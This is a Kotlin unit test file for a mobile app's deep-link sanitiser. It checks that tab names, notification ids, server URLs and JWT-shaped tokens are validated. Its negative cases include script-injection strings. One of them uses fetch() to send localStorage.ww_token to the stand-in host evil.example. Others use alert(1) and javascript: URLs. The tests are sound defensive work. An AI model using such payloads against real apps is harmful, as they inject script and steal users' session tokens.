package com.wattwise.userapp.util

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class DeepLinksTest {

    @Test
    fun `known tabs pass through, case and whitespace are normalised`() {
        assertEquals("notifications", DeepLinks.sanitizeTab(" Notifications "))
        assertEquals("ranking", DeepLinks.sanitizeTab("rankings"))
        assertEquals("notifications", DeepLinks.sanitizeTab("alerts"))
    }

    @Test
    fun `anything that is not a tab name is rejected`() {
        assertNull(DeepLinks.sanitizeTab("');fetch('https://evil.example/'+localStorage.ww_token);('"))
        assertNull(DeepLinks.sanitizeTab("unknown"))
        assertNull(DeepLinks.sanitizeTab(""))
        assertNull(DeepLinks.sanitizeTab(null))
    }

    @Test
    fun `notification ids must be positive numbers`() {
        assertEquals(6849L, DeepLinks.parseNotificationId("6849"))
        assertNull(DeepLinks.parseNotificationId("12);alert(1"))
        assertNull(DeepLinks.parseNotificationId("-4"))
        assertNull(DeepLinks.parseNotificationId(null))
    }

    @Test
    fun `navigation script is built only from whitelisted values`() {
        assertEquals("window.goSection?.('goals');", DeepLinks.navigationJs("goals", null))
        assertNull(DeepLinks.navigationJs("');evil();('", null))
        val open = DeepLinks.navigationJs("notifications", 42L)!!
        assertTrue(open.contains("openAlertFromNative(42)"))
        assertFalse(open.contains("'42'"))
    }

    @Test
    fun `only the configured server origin counts as the server`() {
        val server = "http://67.207.68.22:80"
        assertTrue(DeepLinks.isServerUrl("http://67.207.68.22/notifications?notification=5", server))
        assertTrue(DeepLinks.isServerUrl("http://67.207.68.22#ww_token=abc", server))
        assertFalse(DeepLinks.isServerUrl("http://evil.example/", server))
        assertFalse(DeepLinks.isServerUrl("https://67.207.68.22/", server))      // scheme differs
        assertFalse(DeepLinks.isServerUrl("http://67.207.68.22:3000/", server))  // admin portal is another origin
        assertFalse(DeepLinks.isServerUrl("javascript:alert(1)", server))
        assertFalse(DeepLinks.isServerUrl(null, server))
    }

    @Test
    fun `only token-shaped text is accepted from the dashboard`() {
        assertTrue(DeepLinks.looksLikeJwt("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.abc_DEF-123"))
        assertFalse(DeepLinks.looksLikeJwt(null))
        assertFalse(DeepLinks.looksLikeJwt(""))
        assertFalse(DeepLinks.looksLikeJwt("not-a-token"))
        assertFalse(DeepLinks.looksLikeJwt("aaaaaaaaaa.bbbbbbbbbb"))
        assertFalse(DeepLinks.looksLikeJwt("aaaaaaaaaa.bbbbbbbbbb.cc');alert(1)//"))
    }
}
